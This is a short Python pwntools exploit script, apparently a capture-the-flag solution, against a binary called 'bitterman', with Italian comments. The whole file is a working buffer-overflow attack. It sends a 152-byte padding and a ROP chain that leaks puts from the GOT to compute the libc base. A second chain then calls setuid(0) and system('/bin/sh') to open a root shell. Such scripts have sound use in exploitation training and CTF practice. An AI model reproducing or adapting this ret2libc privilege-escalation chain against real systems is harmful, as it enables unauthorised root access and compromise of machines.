from pwn import *

elf = ELF("./bitterman")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
context.binary = elf

main = 0x4006ec
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi = 0x00400853
ret = 0x00400854

puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
setuid_offset = libc.symbols["setuid"]
sh_offset = next(libc.search(b"/bin/sh"))

offset = 152

payload = b""
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p = process("./bitterman")

p.recvline()
p.sendline(b"pwnd")

p.recvline()
p.recvline()
p.recvline()
p.sendline(b"2048")

p.recvline()
p.sendline(b"A" * offset + payload)

p.recvuntil(b"\x21\x0a")

leak = u64(p.recvline()[:-1].ljust(8, b"\x00"))

libc_base = leak - puts_offset

success("Libc base address: " + hex(libc_base))

payload = b""
payload += p64(pop_rdi)				#Pop in RDI dell'argomento di setuid
payload += p64(0x0)				#0 -> root
payload += p64(libc_base + setuid_offset)	#Chiamo setuid(0)
payload += p64(pop_rdi)				#Pop in rdi dell'argomento di system
payload += p64(libc_base + sh_offset)		#"/bin/sh/"
payload += p64(libc_base + system_offset)	#Chiamo system("/bin/sh")

p.recvline()
p.sendline(b"pwnd")

p.recvline()
p.recvline()
p.recvline()
p.sendline(b"2048")

p.recvline()
p.sendline(b"A" * offset + payload)

success("pwnd")

p.interactive()
